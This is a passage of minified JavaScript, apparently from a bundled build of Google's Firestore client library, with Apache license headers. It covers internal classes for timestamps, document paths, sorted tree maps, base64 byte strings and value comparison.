function(e){let t="undefined"!=typeof self&&(self.crypto||self.msCrypto),n=new Uint8Array(40);if(t&&"function"==typeof t.getRandomValues)t.getRandomValues(n);else for(let e=0;e<40;e++)n[e]=Math.floor(256*Math.random());return n}();for(let i=0;i<r.length;++i)n.length<20&&r[i]<t&&(n+=e.charAt(r[i]%e.length))}return n}}function Ir(e,t){return e<t?-1:e>t?1:0}function Er(e,t,n){return e.length===t.length&&e.every(((e,r)=>n(e,t[r])))}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Tr{constructor(e,t){if(this.seconds=e,this.nanoseconds=t,t<0||t>=1e9)throw new hr(cr.INVALID_ARGUMENT,"Timestamp nanoseconds out of range: "+t);if(e<-62135596800||e>=253402300800)throw new hr(cr.INVALID_ARGUMENT,"Timestamp seconds out of range: "+e)}static now(){return Tr.fromMillis(Date.now())}static fromDate(e){return Tr.fromMillis(e.getTime())}static fromMillis(e){let t=Math.floor(e/1e3);return new Tr(t,Math.floor(1e6*(e-1e3*t)))}toDate(){return new Date(this.toMillis())}toMillis(){return 1e3*this.seconds+this.nanoseconds/1e6}_compareTo(e){return this.seconds===e.seconds?Ir(this.nanoseconds,e.nanoseconds):Ir(this.seconds,e.seconds)}isEqual(e){return e.seconds===this.seconds&&e.nanoseconds===this.nanoseconds}toString(){return"Timestamp(seconds="+this.seconds+", nanoseconds="+this.nanoseconds+")"}toJSON(){return{seconds:this.seconds,nanoseconds:this.nanoseconds}}valueOf(){let e=this.seconds- -62135596800;return String(e).padStart(12,"0")+"."+String(this.nanoseconds).padStart(9,"0")}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Sr{constructor(e){this.timestamp=e}static fromTimestamp(e){return new Sr(e)}static min(){return new Sr(new Tr(0,0))}static max(){return new Sr(new Tr(253402300799,999999999))}compareTo(e){return this.timestamp._compareTo(e.timestamp)}isEqual(e){return this.timestamp.isEqual(e.timestamp)}toMicroseconds(){return 1e6*this.timestamp.seconds+this.timestamp.nanoseconds/1e3}toString(){return"SnapshotVersion("+this.timestamp.toString()+")"}toTimestamp(){return this.timestamp}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class kr{constructor(e,t,n){void 0===t?t=0:t>e.length&&ur(),void 0===n?n=e.length-t:n>e.length-t&&ur(),this.segments=e,this.offset=t,this.len=n}get length(){return this.len}isEqual(e){return 0===kr.comparator(this,e)}child(e){let t=this.segments.slice(this.offset,this.limit());return e instanceof kr?e.forEach((e=>{t.push(e)})):t.push(e),this.construct(t)}limit(){return this.offset+this.length}popFirst(e){return e=void 0===e?1:e,this.construct(this.segments,this.offset+e,this.length-e)}popLast(){return this.construct(this.segments,this.offset,this.length-1)}firstSegment(){return this.segments[this.offset]}lastSegment(){return this.get(this.length-1)}get(e){return this.segments[this.offset+e]}isEmpty(){return 0===this.length}isPrefixOf(e){if(e.length<this.length)return!1;for(let t=0;t<this.length;t++)if(this.get(t)!==e.get(t))return!1;return!0}isImmediateParentOf(e){if(this.length+1!==e.length)return!1;for(let t=0;t<this.length;t++)if(this.get(t)!==e.get(t))return!1;return!0}forEach(e){for(let t=this.offset,n=this.limit();t<n;t++)e(this.segments[t])}toArray(){return this.segments.slice(this.offset,this.limit())}static comparator(e,t){let n=Math.min(e.length,t.length);for(let r=0;r<n;r++){let n=e.get(r),i=t.get(r);if(n<i)return-1;if(n>i)return 1}return e.length<t.length?-1:e.length>t.length?1:0}}class Ar extends kr{construct(e,t,n){return new Ar(e,t,n)}canonicalString(){return this.toArray().join("/")}toString(){return this.canonicalString()}static fromString(...e){let t=[];for(let n of e){if(n.indexOf("//")>=0)throw new hr(cr.INVALID_ARGUMENT,`Invalid segment (${n}). Paths must not contain // in them.`);t.push(...n.split("/").filter((e=>e.length>0)))}return new Ar(t)}static emptyPath(){return new Ar([])}}let Cr=/^[_a-zA-Z][_a-zA-Z0-9]*$/;class Nr extends kr{construct(e,t,n){return new Nr(e,t,n)}static isValidIdentifier(e){return Cr.test(e)}canonicalString(){return this.toArray().map((e=>(e=e.replace(/\\/g,"\\\\").replace(/`/g,"\\`"),Nr.isValidIdentifier(e)||(e="`"+e+"`"),e))).join(".")}toString(){return this.canonicalString()}isKeyField(){return 1===this.length&&"__name__"===this.get(0)}static keyField(){return new Nr(["__name__"])}static fromServerFormat(e){let t=[],n="",r=0,i=()=>{if(0===n.length)throw new hr(cr.INVALID_ARGUMENT,`Invalid field path (${e}). Paths must not be empty, begin with '.', end with '.', or contain '..'`);t.push(n),n=""},s=!1;for(;r<e.length;){let t=e[r];if("\\"===t){if(r+1===e.length)throw new hr(cr.INVALID_ARGUMENT,"Path has trailing escape character: "+e);let t=e[r+1];if("\\"!==t&&"."!==t&&"`"!==t)throw new hr(cr.INVALID_ARGUMENT,"Path has invalid escape sequence: "+e);n+=t,r+=2}else"`"===t?(s=!s,r++):"."!==t||s?(n+=t,r++):(i(),r++)}if(i(),s)throw new hr(cr.INVALID_ARGUMENT,"Unterminated ` in path: "+e);return new Nr(t)}static emptyPath(){return new Nr([])}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Or{constructor(e){this.path=e}static fromPath(e){return new Or(Ar.fromString(e))}static fromName(e){return new Or(Ar.fromString(e).popFirst(5))}static empty(){return new Or(Ar.emptyPath())}get collectionGroup(){return this.path.popLast().lastSegment()}hasCollectionId(e){return this.path.length>=2&&this.path.get(this.path.length-2)===e}getCollectionGroup(){return this.path.get(this.path.length-2)}getCollectionPath(){return this.path.popLast()}isEqual(e){return null!==e&&0===Ar.comparator(this.path,e.path)}toString(){return this.path.toString()}static comparator(e,t){return Ar.comparator(e.path,t.path)}static isDocumentKey(e){return e.length%2==0}static fromSegments(e){return new Or(new Ar(e.slice()))}}class Dr{constructor(e,t,n){this.readTime=e,this.documentKey=t,this.largestBatchId=n}static min(){return new Dr(Sr.min(),Or.empty(),-1)}static max(){return new Dr(Sr.max(),Or.empty(),-1)}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
async function Rr(e){if(e.code!==cr.FAILED_PRECONDITION||"The current tab is not in the required state to perform this operation. It might be necessary to refresh the browser tab."!==e.message)throw e;sr("LocalStore","Unexpectedly lost primary lease")}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class xr{constructor(e){this.nextCallback=null,this.catchCallback=null,this.result=void 0,this.error=void 0,this.isDone=!1,this.callbackAttached=!1,e((e=>{this.isDone=!0,this.result=e,this.nextCallback&&this.nextCallback(e)}),(e=>{this.isDone=!0,this.error=e,this.catchCallback&&this.catchCallback(e)}))}catch(e){return this.next(void 0,e)}next(e,t){return this.callbackAttached&&ur(),this.callbackAttached=!0,this.isDone?this.error?this.wrapFailure(t,this.error):this.wrapSuccess(e,this.result):new xr(((n,r)=>{this.nextCallback=t=>{this.wrapSuccess(e,t).next(n,r)},this.catchCallback=e=>{this.wrapFailure(t,e).next(n,r)}}))}toPromise(){return new Promise(((e,t)=>{this.next(e,t)}))}wrapUserFunction(e){try{let t=e();return t instanceof xr?t:xr.resolve(t)}catch(e){return xr.reject(e)}}wrapSuccess(e,t){return e?this.wrapUserFunction((()=>e(t))):xr.resolve(t)}wrapFailure(e,t){return e?this.wrapUserFunction((()=>e(t))):xr.reject(t)}static resolve(e){return new xr(((t,n)=>{t(e)}))}static reject(e){return new xr(((t,n)=>{n(e)}))}static waitFor(e){return new xr(((t,n)=>{let r=0,i=0,s=!1;e.forEach((e=>{++r,e.next((()=>{++i,s&&i===r&&t()}),(e=>n(e)))})),s=!0,i===r&&t()}))}static or(e){let t=xr.resolve(!1);for(let n of e)t=t.next((e=>e?xr.resolve(e):n()));return t}static forEach(e,t){let n=[];return e.forEach(((e,r)=>{n.push(t.call(this,e,r))})),this.waitFor(n)}static mapArray(e,t){return new xr(((n,r)=>{let i=e.length,s=Array(i),a=0;for(let o=0;o<i;o++){let l=o;t(e[l]).next((e=>{s[l]=e,++a===i&&n(s)}),(e=>r(e)))}}))}static doWhile(e,t){return new xr(((n,r)=>{let i=()=>{!0===e()?t().next((()=>{i()}),r):n()};i()}))}}function Pr(e){return"IndexedDbTransactionError"===e.name}
/**
 * @license
 * Copyright 2018 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Lr{constructor(e,t){this.previousValue=e,t&&(t.sequenceNumberHandler=e=>this.ot(e),this.ut=e=>t.writeSequenceNumber(e))}ot(e){return this.previousValue=Math.max(e,this.previousValue),this.previousValue}next(){let e=++this.previousValue;return this.ut&&this.ut(e),e}}function Mr(e){return 0===e&&1/e==-1/0}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Fr(e){let t=0;for(let n in e)Object.prototype.hasOwnProperty.call(e,n)&&t++;return t}function Ur(e,t){for(let n in e)Object.prototype.hasOwnProperty.call(e,n)&&t(n,e[n])}function Vr(e){for(let t in e)if(Object.prototype.hasOwnProperty.call(e,t))return!1;return!0}Lr.ct=-1;
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class jr{constructor(e,t){this.comparator=e,this.root=t||qr.EMPTY}insert(e,t){return new jr(this.comparator,this.root.insert(e,t,this.comparator).copy(null,null,qr.BLACK,null,null))}remove(e){return new jr(this.comparator,this.root.remove(e,this.comparator).copy(null,null,qr.BLACK,null,null))}get(e){let t=this.root;for(;!t.isEmpty();){let n=this.comparator(e,t.key);if(0===n)return t.value;n<0?t=t.left:n>0&&(t=t.right)}return null}indexOf(e){let t=0,n=this.root;for(;!n.isEmpty();){let r=this.comparator(e,n.key);if(0===r)return t+n.left.size;r<0?n=n.left:(t+=n.left.size+1,n=n.right)}return-1}isEmpty(){return this.root.isEmpty()}get size(){return this.root.size}minKey(){return this.root.minKey()}maxKey(){return this.root.maxKey()}inorderTraversal(e){return this.root.inorderTraversal(e)}forEach(e){this.inorderTraversal(((t,n)=>(e(t,n),!1)))}toString(){let e=[];return this.inorderTraversal(((t,n)=>(e.push(`${t}:${n}`),!1))),`{${e.join(", ")}}`}reverseTraversal(e){return this.root.reverseTraversal(e)}getIterator(){return new Br(this.root,null,this.comparator,!1)}getIteratorFrom(e){return new Br(this.root,e,this.comparator,!1)}getReverseIterator(){return new Br(this.root,null,this.comparator,!0)}getReverseIteratorFrom(e){return new Br(this.root,e,this.comparator,!0)}}class Br{constructor(e,t,n,r){this.isReverse=r,this.nodeStack=[];let i=1;for(;!e.isEmpty();)if(i=t?n(e.key,t):1,t&&r&&(i*=-1),i<0)e=this.isReverse?e.left:e.right;else{if(0===i){this.nodeStack.push(e);break}this.nodeStack.push(e),e=this.isReverse?e.right:e.left}}getNext(){let e=this.nodeStack.pop(),t={key:e.key,value:e.value};if(this.isReverse)for(e=e.left;!e.isEmpty();)this.nodeStack.push(e),e=e.right;else for(e=e.right;!e.isEmpty();)this.nodeStack.push(e),e=e.left;return t}hasNext(){return this.nodeStack.length>0}peek(){if(0===this.nodeStack.length)return null;let e=this.nodeStack[this.nodeStack.length-1];return{key:e.key,value:e.value}}}class qr{constructor(e,t,n,r,i){this.key=e,this.value=t,this.color=null!=n?n:qr.RED,this.left=null!=r?r:qr.EMPTY,this.right=null!=i?i:qr.EMPTY,this.size=this.left.size+1+this.right.size}copy(e,t,n,r,i){return new qr(null!=e?e:this.key,null!=t?t:this.value,null!=n?n:this.color,null!=r?r:this.left,null!=i?i:this.right)}isEmpty(){return!1}inorderTraversal(e){return this.left.inorderTraversal(e)||e(this.key,this.value)||this.right.inorderTraversal(e)}reverseTraversal(e){return this.right.reverseTraversal(e)||e(this.key,this.value)||this.left.reverseTraversal(e)}min(){return this.left.isEmpty()?this:this.left.min()}minKey(){return this.min().key}maxKey(){return this.right.isEmpty()?this.key:this.right.maxKey()}insert(e,t,n){let r=this,i=n(e,r.key);return(r=i<0?r.copy(null,null,null,r.left.insert(e,t,n),null):0===i?r.copy(null,t,null,null,null):r.copy(null,null,null,null,r.right.insert(e,t,n))).fixUp()}removeMin(){if(this.left.isEmpty())return qr.EMPTY;let e=this;return e.left.isRed()||e.left.left.isRed()||(e=e.moveRedLeft()),(e=e.copy(null,null,null,e.left.removeMin(),null)).fixUp()}remove(e,t){let n,r=this;if(0>t(e,r.key))r.left.isEmpty()||r.left.isRed()||r.left.left.isRed()||(r=r.moveRedLeft()),r=r.copy(null,null,null,r.left.remove(e,t),null);else{if(r.left.isRed()&&(r=r.rotateRight()),r.right.isEmpty()||r.right.isRed()||r.right.left.isRed()||(r=r.moveRedRight()),0===t(e,r.key)){if(r.right.isEmpty())return qr.EMPTY;n=r.right.min(),r=r.copy(n.key,n.value,null,null,r.right.removeMin())}r=r.copy(null,null,null,null,r.right.remove(e,t))}return r.fixUp()}isRed(){return this.color}fixUp(){let e=this;return e.right.isRed()&&!e.left.isRed()&&(e=e.rotateLeft()),e.left.isRed()&&e.left.left.isRed()&&(e=e.rotateRight()),e.left.isRed()&&e.right.isRed()&&(e=e.colorFlip()),e}moveRedLeft(){let e=this.colorFlip();return e.right.left.isRed()&&(e=(e=(e=e.copy(null,null,null,null,e.right.rotateRight())).rotateLeft()).colorFlip()),e}moveRedRight(){let e=this.colorFlip();return e.left.left.isRed()&&(e=(e=e.rotateRight()).colorFlip()),e}rotateLeft(){let e=this.copy(null,null,qr.RED,null,this.right.left);return this.right.copy(null,null,this.color,e,null)}rotateRight(){let e=this.copy(null,null,qr.RED,this.left.right,null);return this.left.copy(null,null,this.color,null,e)}colorFlip(){let e=this.left.copy(null,null,!this.left.color,null,null),t=this.right.copy(null,null,!this.right.color,null,null);return this.copy(null,null,!this.color,e,t)}checkMaxDepth(){let e=this.check();return Math.pow(2,e)<=this.size+1}check(){if(this.isRed()&&this.left.isRed()||this.right.isRed())throw ur();let e=this.left.check();if(e!==this.right.check())throw ur();return e+(this.isRed()?0:1)}}qr.EMPTY=null,qr.RED=!0,qr.BLACK=!1,qr.EMPTY=new class{constructor(){this.size=0}get key(){throw ur()}get value(){throw ur()}get color(){throw ur()}get left(){throw ur()}get right(){throw ur()}copy(e,t,n,r,i){return this}insert(e,t,n){return new qr(e,t)}remove(e,t){return this}isEmpty(){return!0}inorderTraversal(e){return!1}reverseTraversal(e){return!1}minKey(){return null}maxKey(){return null}isRed(){return!1}checkMaxDepth(){return!0}check(){return 0}};
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class $r{constructor(e){this.comparator=e,this.data=new jr(this.comparator)}has(e){return null!==this.data.get(e)}first(){return this.data.minKey()}last(){return this.data.maxKey()}get size(){return this.data.size}indexOf(e){return this.data.indexOf(e)}forEach(e){this.data.inorderTraversal(((t,n)=>(e(t),!1)))}forEachInRange(e,t){let n=this.data.getIteratorFrom(e[0]);for(;n.hasNext();){let r=n.getNext();if(this.comparator(r.key,e[1])>=0)return;t(r.key)}}forEachWhile(e,t){let n;for(n=void 0!==t?this.data.getIteratorFrom(t):this.data.getIterator();n.hasNext();)if(!e(n.getNext().key))return}firstAfterOrEqual(e){let t=this.data.getIteratorFrom(e);return t.hasNext()?t.getNext().key:null}getIterator(){return new zr(this.data.getIterator())}getIteratorFrom(e){return new zr(this.data.getIteratorFrom(e))}add(e){return this.copy(this.data.remove(e).insert(e,!0))}delete(e){return this.has(e)?this.copy(this.data.remove(e)):this}isEmpty(){return this.data.isEmpty()}unionWith(e){let t=this;return t.size<e.size&&(t=e,e=this),e.forEach((e=>{t=t.add(e)})),t}isEqual(e){if(!(e instanceof $r)||this.size!==e.size)return!1;let t=this.data.getIterator(),n=e.data.getIterator();for(;t.hasNext();){let e=t.getNext().key,r=n.getNext().key;if(0!==this.comparator(e,r))return!1}return!0}toArray(){let e=[];return this.forEach((t=>{e.push(t)})),e}toString(){let e=[];return this.forEach((t=>e.push(t))),"SortedSet("+e.toString()+")"}copy(e){let t=new $r(this.comparator);return t.data=e,t}}class zr{constructor(e){this.iter=e}getNext(){return this.iter.getNext().key}hasNext(){return this.iter.hasNext()}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Gr{constructor(e){this.fields=e,e.sort(Nr.comparator)}static empty(){return new Gr([])}unionWith(e){let t=new $r(Nr.comparator);for(let e of this.fields)t=t.add(e);for(let n of e)t=t.add(n);return new Gr(t.toArray())}covers(e){for(let t of this.fields)if(t.isPrefixOf(e))return!0;return!1}isEqual(e){return Er(this.fields,e.fields,((e,t)=>e.isEqual(t)))}}
/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Kr extends Error{constructor(){super(...arguments),this.name="Base64DecodeError"
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}class Hr{constructor(e){this.binaryString=e}static fromBase64String(e){let t=function(e){try{return atob(e)}catch(e){throw"undefined"!=typeof DOMException&&e instanceof DOMException?new Kr("Invalid base64 string: "+e):e}}(e);return new Hr(t)}static fromUint8Array(e){let t=function(e){let t="";for(let n=0;n<e.length;++n)t+=String.fromCharCode(e[n]);return t}(e);return new Hr(t)}[Symbol.iterator](){let e=0;return{next:()=>e<this.binaryString.length?{value:this.binaryString.charCodeAt(e++),done:!1}:{value:void 0,done:!0}}}toBase64(){return btoa(this.binaryString)}toUint8Array(){return function(e){let t=new Uint8Array(e.length);for(let n=0;n<e.length;n++)t[n]=e.charCodeAt(n);return t}(this.binaryString)}approximateByteSize(){return 2*this.binaryString.length}compareTo(e){return Ir(this.binaryString,e.binaryString)}isEqual(e){return this.binaryString===e.binaryString}}Hr.EMPTY_BYTE_STRING=new Hr("");let Wr=RegExp(/^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d(?:\.(\d+))?Z$/);function Qr(e){if(e||ur(),"string"==typeof e){let t=0,n=Wr.exec(e);if(n||ur(),n[1]){let e=n[1];t=Number(e=(e+"000000000").substr(0,9))}let r=new Date(e);return{seconds:Math.floor(r.getTime()/1e3),nanos:t}}return{seconds:Jr(e.seconds),nanos:Jr(e.nanos)}}function Jr(e){return"number"==typeof e?e:"string"==typeof e?Number(e):0}function Xr(e){return"string"==typeof e?Hr.fromBase64String(e):Hr.fromUint8Array(e)}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Yr(e){var t,n;return"server_timestamp"===(null===(n=((null===(t=null==e?void 0:e.mapValue)||void 0===t?void 0:t.fields)||{}).__type__)||void 0===n?void 0:n.stringValue)}function Zr(e){let t=Qr(e.mapValue.fields.__local_write_time__.timestampValue);return new Tr(t.seconds,t.nanos)}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ei{constructor(e,t,n,r,i,s,a,o){this.databaseId=e,this.appId=t,this.persistenceKey=n,this.host=r,this.ssl=i,this.forceLongPolling=s,this.autoDetectLongPolling=a,this.useFetchStreams=o}}class ti{constructor(e,t){this.projectId=e,this.database=t||"(default)"}static empty(){return new ti("","")}get isDefaultDatabase(){return"(default)"===this.database}isEqual(e){return e instanceof ti&&e.projectId===this.projectId&&e.database===this.database}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let ni={fields:{__type__:{stringValue:"__max__"}}};function ri(e){return"nullValue"in e?0:"booleanValue"in e?1:"integerValue"in e||"doubleValue"in e?2:"timestampValue"in e?3:"stringValue"in e?5:"bytesValue"in e?6:"referenceValue"in e?7:"geoPointValue"in e?8:"arrayValue"in e?9:"mapValue"in e?Yr(e)?4:gi(e)?9007199254740991:10:ur()}function ii(e,t){if(e===t)return!0;let n=ri(e);if(n!==ri(t))return!1;switch(n){case 0:case 9007199254740991:return!0;case 1:return e.booleanValue===t.booleanValue;case 4:return Zr(e).isEqual(Zr(t));case 3:return function(e,t){if("string"==typeof e.timestampValue&&"string"==typeof t.timestampValue&&e.timestampValue.length===t.timestampValue.length)return e.timestampValue===t.timestampValue;let n=Qr(e.timestampValue),r=Qr(t.timestampValue);return n.seconds===r.seconds&&n.nanos===r.nanos}(e,t);case 5:return e.stringValue===t.stringValue;case 6:return Xr(e.bytesValue).isEqual(Xr(t.bytesValue));case 7:return e.referenceValue===t.referenceValue;case 8:return Jr(e.geoPointValue.latitude)===Jr(t.geoPointValue.latitude)&&Jr(e.geoPointValue.longitude)===Jr(t.geoPointValue.longitude);case 2:return function(e,t){if("integerValue"in e&&"integerValue"in t)return Jr(e.integerValue)===Jr(t.integerValue);if("doubleValue"in e&&"doubleValue"in t){let n=Jr(e.doubleValue),r=Jr(t.doubleValue);return n===r?Mr(n)===Mr(r):isNaN(n)&&isNaN(r)}return!1}(e,t);case 9:return Er(e.arrayValue.values||[],t.arrayValue.values||[],ii);case 10:return function(e,t){let n=e.mapValue.fields||{},r=t.mapValue.fields||{};if(Fr(n)!==Fr(r))return!1;for(let e in n)if(n.hasOwnProperty(e)&&(void 0===r[e]||!ii(n[e],r[e])))return!1;return!0}(e,t);default:return ur()}}function si(e,t){return void 0!==(e.values||[]).find((e=>ii(e,t)))}function ai(e,t){if(e===t)return 0;let n=ri(e),r=ri(t);if(n!==r)return Ir(n,r);switch(n){case 0:case 9007199254740991:return 0;case 1:return Ir(e.booleanValue,t.booleanValue);case 2:return function(e,t){let n=Jr(e.integerValue||e.doubleValue),r=Jr(t.integerValue||t.doubleValue);return n<r?-1:n>r?1:n===r?0:isNaN(n)?isNaN(r)?0:-1:1}(e,t);case 3:return oi(e.timestampValue,t.timestampValue);case 4:return oi(Zr(e),Zr(t));case 5:return Ir(e.stringValue,t.stringValue);case 6:return function(e,t){let n=Xr(e),r=Xr(t);return n.compareTo(r)}(e.bytesValue,t.bytesValue);case 7:return function(e,t){let n=e.split("/"),r=t.split("/");for(let e=0;e<n.length&&e<r.length;e++){let t=Ir(n[e],r[e]);if(0!==t)return t}return Ir(n.length,r.length)}(e.referenceValue,t.referenceValue);case 8:return function(e,t){let n=Ir(Jr(e.latitude),Jr(t.latitude));return 0!==n?n:Ir(Jr(e.longitude),Jr(t.longitude))}(e.geoPointValue,t.geoPointValue);case 9:return function(e,t){let n=e.values||[],r=t.values||[];for(let e=0;e<n.length&&e<r.length;++e){let t=ai(n[e],r[e]);if(t)return t}return Ir(n.length,r.length)}(e.arrayValue,t.arrayValue);case 10:return function(e,t){if(e===ni&&t===ni)return 0;if(e===ni)return 1;if(t===ni)return-1;let n=e.fields||{},r=Object.keys(n),i=t.fields||{},s=Object.keys(i);r.sort(),s.sort();for(let e=0;e<r.length&&e<s.length;++e){let t=Ir(r[e],s[e]);if(0!==t)return t;let a=ai(n[r[e]],i[s[e]]);if(0!==a)return a}return Ir(r.length,s.length)}(e.mapValue,t.mapValue);default:throw ur()}}function oi(e,t){if("string"==typeof e&&"string"==typeof t&&e.length===t.length)return Ir(e,t);let n=Qr(e),r=Qr(t),i=Ir(n.seconds,r.seconds);return 0!==i?i:Ir(n.nanos,r.nanos)}function li(e){var t,n;return"nullValue"in e?"null":"booleanValue"in e?""+e.booleanValue:"integerValue"in e?""+e.integerValue:"doubleValue"in e?""+e.doubleValue:"timestampValue"in e?function(e){let t=Qr(e);return`time(${t.seconds},${t.nanos})`}(e.timestampValue):"stringValue"in e?e.stringValue:"bytesValue"in e?Xr(e.bytesValue).toBase64():"referenceValue"in e?(n=e.referenceValue,Or.fromName(n).toString()):"geoPointValue"in e?`geo(${(t=e.geoPointValue).latitude},${t.longitude})`:"arrayValue"in e?function(e){let t="[",n=!0;for(let r of e.values||[])n?n=!1:t+=",",t+=li(r);return t+"]"}(e.arrayValue):"mapValue"in e?function(e){let 